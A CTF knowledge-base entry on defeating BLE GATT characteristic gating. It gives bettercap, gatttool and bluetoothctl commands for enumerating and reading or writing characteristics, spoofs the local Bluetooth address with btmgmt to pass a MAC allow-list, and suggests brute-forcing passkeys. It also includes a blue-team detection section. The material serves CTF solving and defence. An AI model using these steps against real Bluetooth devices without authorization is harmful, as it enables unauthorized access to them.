# CTFTCTE-IOT-007 — Enumerate and drive BLE GATT as a client

> **Type:** Counter-Technique  
> **Tactic:** [`CTFT-TA-IOT`](../tactics/CTFT-TA-IOT.md) — IoT / Embedded  
> **Counters technique:** [`CTFTTE-IOT-007`](../techniques/CTFTTE-IOT-007.md) — BLE GATT characteristic gating (pairing / passkey / MAC allow-list / password)

---

## Offensive Recovery (CTF practitioner / solver)

Act as a GATT client against the peripheral:

```bash
# 1. Scan / connect and enumerate services, characteristics and handles
bettercap -eval "ble.recon on; ble.show"        # or: ble.enum <MAC>
gatttool -b <MAC> --characteristics             # list char handles + properties + UUIDs
# 2. Read / write a characteristic by handle (values are hex)
gatttool -b <MAC> --char-read -a 0x0016 | awk -F': ' '{print $2}' | xxd -r -p
gatttool -b <MAC> --char-write-req -a 0x002e -n $(echo -n "deadbeef" | xxd -ps)
# 3. Pair when the peripheral requires a passkey
bluetoothctl                                    # agent KeyboardOnly; default-agent; scan on; pair <MAC>
# 4. Spoof the local BD_ADDR for a MAC allow-list gate
sudo btmgmt power off; sudo btmgmt public-addr 11:22:33:44:55:66; sudo btmgmt power on
# 5. Brute force a 6-digit passkey, or a characteristic password (wordlist, e.g. rockyou.txt)
```

Inspect advertisements and notifications with **nRF Connect**; analyse a provided BLE **PCAP** in
Wireshark (`btatt`/`btgatt` filters). The write-then-read handle pattern (write a selector/password,
read the flag handle) is the core loop.

## Forensic / Blue-Team Perspective (DFIR analyst)

BLE pairing, bonding and GATT access are visible in HCI traces (`btmon`, Linux `hci` snoop logs):
repeated passkey attempts (brute force), rapid re-bonding, and a spoofed/changed local BD_ADDR are
detectable, as is an unexpected central reading privileged characteristics.

## Related MITRE ATT&CK

| ATT&CK ID | ATT&CK technique | Relation note |
| --- | --- | --- |
| T1071 | Application Layer Protocol | GATT read/write is the recovery channel. |
| T1110.001 | Brute Force: Password Guessing | Passkey / characteristic-password brute force. |

## Tools

- [gatttool](../tools/CTFTTOU-416.md)
- [bettercap](../tools/CTFTTOU-283.md)
- bluetoothctl
- btmgmt

## References

- [bi0s — BLE CTF Infinity write-up](https://blog.bi0s.in/2026/08/25/Hardware/BLE_CTF_Infinity_Writeup_BIOS/)
- <https://github.com/hackgnar/ble_ctf_infinity>
